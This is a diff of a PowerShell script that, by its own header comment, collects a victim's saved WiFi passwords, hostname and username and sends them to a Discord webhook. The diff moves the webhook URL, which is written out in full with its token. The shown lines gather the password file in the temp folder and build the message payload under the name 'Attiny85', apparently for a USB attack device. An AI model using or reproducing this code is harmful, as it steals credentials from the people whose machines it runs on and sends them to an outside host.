@@ -1,6 +1,6 @@
 # This code gets the WiFi passwords from a victim (with some basic info such as Hostname and Username), and sends them to a Discord Webhook
 
-$Uri='https://discord.com/api/webhooks/1104465116013011084/vKWjM-6IGZ7YkKmwVMwJShLkK4oxi4CsFhnZI6jHiz9Jlyqux9ByODf7c3EUIrSIOdb1'
+$WebhookURL = "https://discord.com/api/webhooks/1104465116013011084/vKWjM-6IGZ7YkKmwVMwJShLkK4oxi4CsFhnZI6jHiz9Jlyqux9ByODf7c3EUIrSIOdb1"
 $Body = ''
 Set-Location -Path $env:TEMP
 $hostname = hostname
@@ -20,7 +20,6 @@ foreach($line in Get-Content .\Wi-Fi-PASS)
         $Body = $Body + $line + "`n"
     }
 }
-$WebhookURL = "https://discord.com/api/webhooks/1104465116013011084/vKWjM-6IGZ7YkKmwVMwJShLkK4oxi4CsFhnZI6jHiz9Jlyqux9ByODf7c3EUIrSIOdb1"
 $Payload = @{
     "content" = $Body
     "username" = "Attiny85"
